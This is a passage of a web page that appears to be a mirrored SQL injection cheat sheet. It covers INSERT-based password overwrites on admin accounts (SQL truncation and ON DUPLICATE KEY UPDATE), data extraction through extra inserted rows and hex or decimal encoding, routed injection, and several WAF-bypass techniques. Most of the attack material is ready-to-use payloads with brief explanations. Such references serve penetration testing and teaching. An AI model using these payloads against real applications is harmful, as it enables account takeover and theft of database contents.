</code></pre></div></div> <h2 id="insert-statement">Insert Statement</h2> <h3 id="modify-password-of-existing-objectuser">Modify password of existing object/user</h3> <p>To do so you should try to <strong>create a new object named as the “master object”</strong> (probably <strong>admin</strong> in case of users) modifying something:</p> <ul> <li>Create user named: <strong>AdMIn</strong> (uppercase &amp; lowercase letters)</li> <li>Create a user named: <strong>admin=</strong> </li> <li> <strong>SQL Truncation Attack</strong> (when there is some kind of <strong>length limit</strong> in the username or email) –&gt; Create user with name: <strong>admin [a lot of spaces] a</strong> </li> </ul> <h4 id="sql-truncation-attack">SQL Truncation Attack</h4> <p>If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user <strong>admin</strong>, try to create a username called: “<em>admin [30 spaces] a</em>” and any password.</p> <p>The database will <strong>check</strong> if the introduced <strong>username</strong> <strong>exists</strong> inside the database. If <strong>not</strong>, it will <strong>cut</strong> the <strong>username</strong> to the <strong>max allowed number of characters</strong> (in this case to: “<em>admin [25 spaces]</em>”) and the it will <strong>automatically remove all the spaces at the end updating</strong> inside the database the user “<strong>admin</strong>” with the <strong>new password</strong> (some error could appear but it doesn’t means that this hasn’t worked).</p> <p>More info: <a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html" rel="external nofollow noopener" target="_blank">https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html</a> &amp; <a href="https://resources.infosecinstitute.com/sql-truncation-attack/#gref" rel="external nofollow noopener" target="_blank">https://resources.infosecinstitute.com/sql-truncation-attack/#gref</a></p> <p><em>Note: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check:</em> <a href="https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation" rel="external nofollow noopener" target="_blank"><em>https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation</em></a></p> <h3 id="mysql-insert-time-based-checking">MySQL Insert time based checking</h3> <p>Add as much <code class="language-plaintext highlighter-rouge">','',''</code> as you consider to exit the VALUES statement. If delay is executed, you have a SQLInjection.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">name</span><span class="o">=</span><span class="s1">',</span><span class="se">''</span><span class="s1">);WAITFOR%20DELAY%20'</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">5</span><span class="s1">'--%20-
</span></code></pre></div></div> <h3 id="on-duplicate-key-update">ON DUPLICATE KEY UPDATE</h3> <p>The <code class="language-plaintext highlighter-rouge">ON DUPLICATE KEY UPDATE</code> clause in MySQL is utilized to specify actions for the database to take when an attempt is made to insert a row that would result in a duplicate value in a UNIQUE index or PRIMARY KEY. The following example demonstrates how this feature can be exploited to modify the password of an administrator account:</p> <p>Example Payload Injection:</p> <p>An injection payload might be crafted as follows, where two rows are attempted to be inserted into the <code class="language-plaintext highlighter-rouge">users</code> table. The first row is a decoy, and the second row targets an existing administrator’s email with the intention of updating the password:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="nv">"generic_user@example.com"</span><span class="p">,</span> <span class="nv">"bcrypt_hash_of_newpassword"</span><span class="p">),</span> <span class="p">(</span><span class="nv">"admin_generic@example.com"</span><span class="p">,</span> <span class="nv">"bcrypt_hash_of_newpassword"</span><span class="p">)</span> <span class="k">ON</span> <span class="n">DUPLICATE</span> <span class="k">KEY</span> <span class="k">UPDATE</span> <span class="n">password</span><span class="o">=</span><span class="nv">"bcrypt_hash_of_newpassword"</span> <span class="c1">-- ";</span>
</code></pre></div></div> <p>Here’s how it works:</p> <ul> <li>The query attempts to insert two rows: one for <code class="language-plaintext highlighter-rouge">generic_user@example.com</code> and another for <code class="language-plaintext highlighter-rouge">admin_generic@example.com</code>.</li> <li>If the row for <code class="language-plaintext highlighter-rouge">admin_generic@example.com</code> already exists, the <code class="language-plaintext highlighter-rouge">ON DUPLICATE KEY UPDATE</code> clause triggers, instructing MySQL to update the <code class="language-plaintext highlighter-rouge">password</code> field of the existing row to “bcrypt_hash_of_newpassword”.</li> <li>Consequently, authentication can then be attempted using <code class="language-plaintext highlighter-rouge">admin_generic@example.com</code> with the password corresponding to the bcrypt hash (“bcrypt_hash_of_newpassword” represents the new password’s bcrypt hash, which should be replaced with the actual hash of the desired password).</li> </ul> <h3 id="extract-information">Extract information</h3> <h4 id="creating-2-accounts-at-the-same-time">Creating 2 accounts at the same time</h4> <p>When trying to create a new user and username, password and email are needed:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQLi payload:
username=TEST&amp;password=TEST&amp;email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
</code></pre></div></div> <h4 id="using-decimal-or-hexadecimal">Using decimal or hexadecimal</h4> <p>With this technique you can extract information creating only 1 account. It is important to note that you don’t need to comment anything.</p> <p>Using <strong>hex2dec</strong> and <strong>substr</strong>:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'</span>
</code></pre></div></div> <p>To get the text you can use:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">binascii</span><span class="sh">'</span><span class="p">).</span><span class="nf">unhexlify</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="mi">215573607263</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span>
</code></pre></div></div> <p>Using <strong>hex</strong> and <strong>replace</strong> (and <strong>substr</strong>):</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","</span><span class="se">\"</span><span class="s1">"),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'</span>

<span class="s1">'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","</span><span class="se">\"</span><span class="s1">"),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'</span>

<span class="o">#</span><span class="k">Full</span> <span class="n">ascii</span> <span class="n">uppercase</span> <span class="k">and</span> <span class="n">lowercase</span> <span class="k">replace</span><span class="p">:</span>
<span class="s1">'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","</span><span class="se">\"</span><span class="s1">"),"m","#"),"o","$"),"_","%"),"z","&amp;"),"J","'</span><span class="nv">"),"</span><span class="n">K</span><span class="nv">","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&amp;&amp;")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
</span></code></pre></div></div> <h2 id="routed-sql-injection">Routed SQL injection</h2> <p>Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. (<a href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt" rel="external nofollow noopener" target="_blank">From Paper</a>)</p> <p>Example:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
</code></pre></div></div> <h2 id="waf-bypass">WAF Bypass</h2> <p><a href="https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass" rel="external nofollow noopener" target="_blank">Initial bypasses from here</a></p> <h3 id="no-spaces-bypass">No spaces bypass</h3> <p>No Space (%20) - bypass using whitespace alternatives</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">09</span><span class="k">and</span><span class="o">%</span><span class="mi">091</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">09</span><span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">Dand</span><span class="o">%</span><span class="mi">0</span><span class="n">D1</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">Cand</span><span class="o">%</span><span class="mi">0</span><span class="n">C1</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="k">C</span><span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">Band</span><span class="o">%</span><span class="mi">0</span><span class="n">B1</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">B</span><span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">Aand</span><span class="o">%</span><span class="mi">0</span><span class="n">A1</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="n">A0and</span><span class="o">%</span><span class="n">A01</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="n">A0</span><span class="c1">--</span>
</code></pre></div></div> <p>No Whitespace - bypass using comments</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="cm">/*comment*/</span><span class="k">and</span><span class="cm">/**/</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="cm">/**/</span><span class="c1">--</span>
</code></pre></div></div> <p>No Whitespace - bypass using parenthesis</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">and</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">--</span>
</code></pre></div></div> <h3 id="no-commas-bypass">No commas bypass</h3> <p>No Comma - bypass using OFFSET, FROM and JOIN</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LIMIT 0,1         -&gt; LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -&gt; SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
</code></pre></div></div> <h3 id="generic-bypasses">Generic Bypasses</h3> <p>Blacklist using keywords - bypass using uppercase/lowercase</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AnD</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">aNd</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
</code></pre></div></div> <p>Blacklist using keywords case insensitive - bypass using an equivalent operator</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AND   -&gt; &amp;&amp; -&gt; %26%26
OR    -&gt; || -&gt; %7C%7C
=     -&gt; LIKE,REGEXP,RLIKE, not &lt; and not &gt;
&gt; X   -&gt; not between 0 and X
WHERE -&gt; HAVING --&gt; LIMIT X,1 -&gt; group_concat(CASE(table_schema)When(database())Then(table_name)END) -&gt; group_concat(if(table_schema=database(),table_name,null))
</code></pre></div></div> <h3 id="scientific-notation-waf-bypass">Scientific Notation WAF bypass</h3> <p>You can find a more in depth explaination of this trick in <a href="https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/" rel="external nofollow noopener" target="_blank">gosecure blog</a>.<br> Basically you can use the scientific notation in unexpected ways for the WAF to bypass it:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
</code></pre></div></div> <h3 id="bypass-column-names-restriction">Bypass Column Names Restriction</h3> <p>First of all, notice that if the <strong>original query and the table where you want to extract the flag from have the same amount of columns</strong> you might just do: <code class="language-plaintext highlighter-rouge">0 UNION SELECT * FROM flag</code></p> <p>It’s possible to <strong>access the third column of a table without using its name</strong> using a query like the following: <code class="language-plaintext highlighter-rouge">SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;</code>, so in an sqlinjection this would looks like:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># This is an example with 3 columns that will extract the column number 3</span>
<span class="nt">-1</span> UNION SELECT 0, 0, 0, F.3 FROM <span class="o">(</span>SELECT 1, 2, 3 UNION SELECT <span class="k">*</span> FROM demo<span class="o">)</span>F<span class="p">;</span>
</code></pre></div></div> <p>Or using a <strong>comma bypass</strong>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"</span>
<span class="nt">-1</span> union <span class="k">select</span> <span class="k">*</span> from <span class="o">(</span><span class="k">select </span>1<span class="o">)</span>a <span class="nb">join</span> <span class="o">(</span><span class="k">select </span>2<span class="o">)</span>b <span class="nb">join</span> <span class="o">(</span><span class="k">select </span>F.3 from <span class="o">(</span><span class="k">select</span> <span class="k">*</span> from <span class="o">(</span><span class="k">select </span>1<span class="o">)</span>q <span class="nb">join</span> <span class="o">(</span><span class="k">select </span>2<span class="o">)</span>w <span class="nb">join</span> <span class="o">(</span><span class="k">select </span>3<span class="o">)</span>e <span class="nb">join</span> <span class="o">(</span><span class="k">select </span>4<span class="o">)</span>r union <span class="k">select</span> <span class="k">*</span> from flag limit 1 offset 5<span class="o">)</span>F<span class="o">)</span>c
</code></pre></div></div> <p>This trick was taken from <a href="https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/" rel="external nofollow noopener" target="_blank">https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/</a></p> <h3 id="waf-bypass-suggester-tools">WAF bypass suggester tools</h3> <p>https://github.com/m4ll0k/Atlas</p> <h2 id="other-guides">Other Guides</h2> <ul> <li><a href="https://sqlwiki.netspi.com" rel="external nofollow noopener" target="_blank">https://sqlwiki.netspi.com/</a></li> <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" rel="external nofollow noopener" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li> </ul> <h2 id="brute-force-detection-list">Brute-Force Detection List</h2> <p>https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt</p> <p>​</p> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>